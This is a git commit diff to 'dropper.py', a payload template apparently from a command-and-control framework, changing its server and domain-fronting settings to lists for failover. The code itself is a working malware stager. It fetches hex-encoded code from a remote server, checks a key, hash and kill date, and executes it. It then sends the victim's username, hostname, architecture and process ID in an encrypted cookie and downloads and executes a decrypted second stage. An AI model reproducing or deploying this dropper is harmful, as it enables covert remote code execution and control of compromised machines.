1c20a644a59b1b8fb95010d08a8647618fce8da9
Doug <dmcleod@>
2020-07-01 15:04:54 +0100

    Updated comms failover and rotation

--- resources/payload-templates/dropper.py
+++ resources/payload-templates/dropper.py
@@ -1,13 +1,13 @@
 import urllib2,os,sys,base64,ssl,socket,pwd,hashlib,time
-kd=time.strptime("#REPLACEKILLDATE#","%d/%m/%Y")
+kdn=time.strptime("#REPLACEKILLDATE#","%d/%m/%Y")
 pyhash="#REPLACEPYTHONHASH#"
 pykey="#REPLACESPYTHONKEY#"
 key="#REPLACEKEY#"
-serverclean="#REPLACEHOSTPORT#"
+serverclean=[#REPLACEHOSTPORT#]
 urlid="#REPLACEURLID#"
-url="#REPLACEQUICKCOMMAND#"
-url2="#REPLACECONNECTURL#"
-hh="#REPLACEDOMAINFRONT#"
+url=serverclean[0]+"#REPLACEQUICKCOMMAND#"
+url2=serverclean[0]+"#REPLACECONNECTURL#"
+hh=[#REPLACEDOMAINFRONT#]
 ua="#REPLACEUSERAGENT#"
 cstr=time.strftime("%d/%m/%Y",time.gmtime());cstr=time.strptime(cstr,"%d/%m/%Y")
 # This doesn't exist in python < 2.7.9
@@ -17,12 +17,12 @@ if hh: r=urllib2.Request(url,headers={'Host':hh,'User-agent':ua})
 else: r=urllib2.Request(url,headers={'User-agent':ua})
 res=urllib2.urlopen(r);d=res.read();c=d[1:];b=c.decode("hex")
 s=hashlib.sha512(b)
-if pykey in b and pyhash == s.hexdigest() and cstr < kd: exec(b)
+if pykey in b and pyhash == s.hexdigest() and cstr < kdn: exec(b)
 else: sys.exit(0)
 un=pwd.getpwuid(os.getuid())[ 0 ];pid=os.getpid()
 is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
 hn=socket.gethostname();o=urllib2.build_opener()
 encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,urlid))
-if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
+if hh[0]:r=urllib2.Request(url2,headers={'Host':hh[0],'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
 else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
 res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\0');exec(base64.b64decode(x))
